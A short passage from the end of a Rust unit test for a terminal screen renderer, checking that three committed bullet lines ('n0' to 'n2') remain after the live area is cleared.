        }
        screen.render(&mut app).unwrap();
        screen.commit_all(&mut app).unwrap();
        screen.clear_live().unwrap();
        let expected: Vec<String> = (0..3).map(|i| format!("· n{i}")).collect();
        assert_eq!(nonblank(everything(&screen)), expected);
    }
}
